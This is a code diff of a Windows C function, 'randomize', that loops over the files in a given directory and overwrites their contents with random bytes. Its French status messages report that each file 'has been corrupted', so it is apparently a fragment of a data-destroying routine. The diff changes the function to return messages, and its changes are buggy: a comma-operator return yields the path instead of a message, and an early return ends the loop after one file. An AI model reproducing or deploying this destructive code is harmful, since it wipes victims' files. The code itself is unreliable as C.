@@ -5,7 +5,7 @@
 #include <stdlib.h>
 #include <time.h>
 
-void randomize(const char *directoryPath)
+const char *randomize(const char *directoryPath)
 {
     char searchPath[MAX_PATH];
     snprintf(searchPath, MAX_PATH, "%s\\*", directoryPath);
@@ -36,10 +36,11 @@ void randomize(const char *directoryPath)
                         fputc(random, file);
                     }
                     fclose(file);
+                    return ("Le fichier a bien ete corrompue");
                 }
                 else
                 {
-                    printf("Impossible d'ouvrir le fichier : %s\n", filePath);
+                    return("Impossible d'ouvrir le fichier \n");
                 }
             }
         } while (FindNextFile(hFind, &FindFileData) != 0);
@@ -47,7 +48,7 @@ void randomize(const char *directoryPath)
     }
     else
     {
-        printf("Répertoire invalide/vide : %s\n", directoryPath);
+        return("Répertoire invalide/vide : %s\n", directoryPath);
     }
 }
 
